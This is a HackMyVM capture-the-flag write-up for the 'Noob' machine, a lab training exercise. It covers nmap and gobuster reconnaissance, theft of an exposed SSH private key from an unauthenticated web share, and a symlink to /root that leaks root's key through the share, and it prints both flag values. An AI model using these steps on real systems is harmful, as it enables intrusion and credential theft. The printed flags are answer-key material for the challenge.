# Noob — HackMyVM Writeup
 
| Machine | Author | Level/Difficulty |
|---------|--------|-------------------|
| Noob | @sml | Easy |
 
Welcome to the **Noob** writeup! In this machine we cover the full hacking cycle:
 
- Reconnaissance
- Directory fuzzing on a non-standard port
- Credential discovery via an exposed SSH key
- Lateral movement via a symlink trick
- Privilege escalation to root
---
 
## Summary
 
This machine exposes a web service on a non-default port (`65530`) that shares files from the filesystem with no access control. Browsing that share leaks a user's SSH private key and their `authorized_keys` file, which is enough to log in directly over SSH — this is an **Information Disclosure / Sensitive Data Exposure** vulnerability (CWE-200): the web share should never have made `.ssh/` material reachable.
 
Once inside as a low-privilege user, root could not be reached through `sudo`, SUID binaries, or cron jobs. Instead, privilege escalation relied on a **Symlink Attack (Arbitrary File Read via Symbolic Link)**: since the same unrestricted file share was also serving the user's own home directory, creating a symlink (`ln -s /root root`) inside that home folder tricked the web server into following it and exposing the contents of `/root` — including `root`'s own private SSH key — through the browser. That key was then used to authenticate directly as `root` over SSH, with no further exploitation needed.
 
In short: **an exposed, unauthenticated file share + a symlink pointed at a restricted directory = full credential leak and root access.**
 
---
 
## 1. Reconnaissance
 
First we create our working directory for this machine:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop]
└─# mkdir Noob
┌──(root㉿kali)-[/home/r4v3x/Desktop]
└─# cd Noob
```
 
We look for the target's IP address with `arp-scan`:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# sudo arp-scan -l | grep "PCS"
192.168.0.20    08:00:27:5b:56:10       PCS Systemtechnik GmbH
```
 
We then run an Nmap scan to check for open ports:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.20
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 21:55 -0500
...
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
65530/tcp open  unknown syn-ack ttl 64
MAC Address: 08:00:27:5B:56:10 (Oracle VirtualBox virtual NIC)
 
Nmap done: 1 IP address (1 host up) scanned in 62.33 seconds
Raw packets sent: 152415 (6.706MB) | Rcvd: 37624 (1.505MB)
```
 
As we can see, we have **22/TCP (SSH)** open, along with an unusual **65530/TCP** port. We run a follow-up scan focused on just those two ports:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# nmap -p22,65530 192.168.0.20
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 22:01 -0500
Nmap scan report for 192.168.0.20
Host is up (0.00099s latency).
 
PORT      STATE SERVICE
22/tcp    open  ssh
65530/tcp open  unknown
MAC Address: 08:00:27:5B:56:10 (Oracle VirtualBox virtual NIC)
 
Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
```
 
---
 
## 2. Enumeration
 
With port `65530` open and serving something unknown, it's time to fuzz for directories with **Gobuster**. First, we clone a repository with directory wordlists:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# git clone https://github.com/danielmiessler/SecLists.git
Cloning into 'SecLists'...
remote: Enumerating objects: 65698, done.
remote: Total 65698 (delta 0), reused 0 (delta 0), pack-reused 65698 (from 1)
Receiving objects: 100% (65698/65698), 3.59 GiB | 8.30 MiB/s, done.
Resolving deltas: 100% (47067/47067), done.
Updating files: 100% (6277/6277), done.
```
 
With the wordlist ready, we run Gobuster against port `65530`:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# gobuster dir -u http://192.168.0.20:65530 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,jpg -r -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.20:65530
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,jpg
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 19]
nt4share             (Status: 200) [Size: 179]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```
 
Gobuster found two paths: `index` and `nt4share`.
 
Visiting `index` shows a simple page:
 
<img width="966" height="190" alt="image" src="https://github.com/user-attachments/assets/b14990cc-6bd3-401c-ab7f-d79b2c042e75" />
`nt4share`, on the other hand, exposes a browsable share with useful information:
 
<img width="946" height="224" alt="image" src="https://github.com/user-attachments/assets/7169b348-88e0-48d6-8b75-2a0a7dc4b2d1" />
Browsing through it, we find an `id_rsa` private key, which we save locally with `nano`:
 
<img width="587" height="567" alt="image" src="https://github.com/user-attachments/assets/afa3dfa6-c9cd-47e7-a1cc-304a8fdda8a8" />
We set the correct permissions on it:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# chmod 600 id_rsa
```
 
Digging a bit further into the share, we also find an `authorized_keys` file that reveals a username:
 
<img width="551" height="166" alt="image" src="https://github.com/user-attachments/assets/7ec26c35-1076-4bbc-af3c-c35d088669ff" />
<img width="1901" height="250" alt="image" src="https://github.com/user-attachments/assets/78e64318-e366-47e3-ab7f-d377520d552b" />
The user is called **adela**, so we try connecting over SSH with the key we recovered.
 
---
 
## 3. Exploitation
 
### A. Access as adela
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# ssh -i id_rsa adela@192.168.0.20
The authenticity of host '192.168.0.20 (192.168.0.20)' can't be established.
ED25519 key fingerprint is: SHA256:0ug88klEB+Auk3kP/jhWOHJJZmKXY2RjjR4GnhZdYuQ
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts.
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
Last login: Wed Jul 14 02:50:51 2021 from 192.168.1.51
adela@noob:~$
```
 
We're in as **adela**, but there's nothing of interest sitting directly in the home directory.
 
### B. Pivot back through the web share with a symlink
 
Since `nt4share` serves files out of a web root, we can abuse it to browse parts of the filesystem we otherwise can't reach over SSH. From `adela`'s shell, we create a folder and symlink it straight to `/root`:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# ssh -i id_rsa adela@192.168.0.20
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
Last login: Sun Nov  8 22:57:00 2026 from 192.168.0.13
adela@noob:~$ ls
adela@noob:~$ mkdir root
adela@noob:~$ ln -s /root root
adela@noob:~$
```
 
<img width="599" height="246" alt="image" src="https://github.com/user-attachments/assets/ef9cf2be-1702-498e-bf60-804e149cb2e9" />
Back on the website, a new `root` directory now shows up — the symlink lets the web server follow it straight into `/root`:
 
<img width="465" height="229" alt="image" src="https://github.com/user-attachments/assets/aee14e60-b994-4ec2-a59d-7898d5b45c37" />
Clicking into it, we navigate to `.ssh/` and find root's own `id_rsa`, which we save locally as `id_rsa2`:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# nano id_rsa2
```
 
<img width="773" height="561" alt="image" src="https://github.com/user-attachments/assets/db98827e-596b-4293-ae84-aba0b6c43e9e" />
### C. Access as root
 
With the key saved, we set the right permissions and connect as `root`:
 
```
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# ls
id_rsa  id_rsa2
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# chmod 600 id_rsa2
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# ssh -i id_rsa2 root@192.168.0.20
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
Last login: Wed Jul 14 02:50:11 2021
root@noob:~# whoami
root
root@noob:~#
```
 
We're now **root**.
 
---
 
## 4. Capturing the Flags
 
```
root@noob:~# find / -name "user.txt" 2>/dev/null
/root/user.txt
root@noob:~# ls
root.txt  user.txt
root@noob:~# cat user.txt
HMVVCXUIUHFDSUIYREWDS432
root@noob:~# cat root.txt
HMVA97DSA8732HJGDSA78623
```
 
---
 
## 🏁 Flags
 
| Flag | Location | Value |
|------|----------|-------|
| User | `/root/user.txt` | `HMVVCXUIUHFDSUIYREWDS432` |
| Root | `/root/root.txt` | `HMVA97DSA8732HJGDSA78623` |
 
---
 
*Machine rooted — full cycle complete: recon → directory fuzzing → SSH key discovery → symlink pivot → root access.*





                    
